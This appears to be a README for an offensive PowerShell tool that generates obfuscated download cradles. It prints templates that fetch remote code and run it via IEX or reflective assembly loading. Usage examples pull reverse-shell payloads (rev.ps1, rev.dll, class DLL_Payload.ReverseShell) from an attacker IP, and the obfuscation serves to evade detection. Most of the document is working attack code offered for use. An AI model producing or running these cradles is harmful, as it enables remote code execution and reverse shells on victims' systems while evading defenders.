# Obfuscated PowerShell Download Cradles

Get-DownloadCradle is a project that stems from the [Invoke-PSObfuscation](https://github.com/gh0x0st/invoke-psobfuscation) framework, with the sole purpose of producing obfuscated download cradles for PowerShell. 

## Cradle Templates

This script includes templates for three PowerShell download cradles, namely `DownloadString`, `DownloadFile` and `DownloadData`. The resulting payloads are output as a one liner, but have been split below for readability. 

__DownloadString__

```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadString("<DOWNLOADPATH>") | IEX
```
__DownloadFile__

```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("<DOWNLOADPATH>","<LOCALPATH>")
$Assem = [System.Reflection.Assembly]::LoadFile("<LOCALPATH>")
$Class = $Assem.GetType("<CLASSNAME>")
$Method = $Class.GetMethod("<METHODNAME>")
$Method.Invoke(0,$null)
```

__DownloadData__

```powershell
$WebClient = New-Object System.Net.WebClient
$Data = $WebClient.DownloadData("<DOWNLOADPATH>")
$Assem = [System.Reflection.Assembly]::Load($Data)
$Class = $Assem.GetType("<CLASSNAME>")
$Method = $Class.GetMethod("<METHODNAME>")
$Method.Invoke(0,$null)
```

## Requirements

This script was built and tested on the following version Kali Linux and PowerShell. The obfuscated cradles are compatible on Windows systems that support PowerShell newer than version 2.0

```shell
┌──(kali㉿kali)-[/home/kali]
└─PS> $PSVersionTable

Name                           Value
----                           -----
PSVersion                      7.2.4
PSEdition                      Core
GitCommitId                    7.2.4
OS                             Linux 5.18.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.5-1kali6 (2022-07-07)
Platform                       Unix
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0…}
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
WSManStackVersion              3.0
```

## Usage Examples

To load the script on Kali Linux, open a terminal then run `pwsh`. With PowerShell now running in your terminal, you can load the script into your current session by dot sourcing the script.

```shell
┌──(kali㉿kali)-[~]
└─$ pwsh
PowerShell 7.2.4
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

┌──(kali㉿kali)-[/home/kali]
└─PS> . ./Get-DownloadCradle.ps1
```

With the script loaded into our PowerShell session, we need to run the `Get-DownloadCradle` function and supply the cradle type and accompanying information to inject into the payload. Keep in mind that your class and method names are unique to your corresponding payload.

__DownloadString__

`Get-DownloadCradle -DownloadString -DownloadPath http://192.168.49.80/rev.ps1`

__DownloadFile__

`Get-DownloadCradle -DownloadFile -DownloadPath http://192.168.49.80/rev.dll -LocalPath C:\rev.dll -Class DLL_Payload.ReverseShell -Method runner`

__DownloadData__

`Get-DownloadCradle -DownloadData -DownloadPath http://192.168.49.80/rev.dll -Class DLL_Payload.ReverseShell -Method runner`

__Output to File__

`Get-DownloadCradle -DownloadData -DownloadPath http://192.168.49.80/rev.dll -Class DLL_Payload.ReverseShell -Method runner -OutFile obfuscated.ps1`
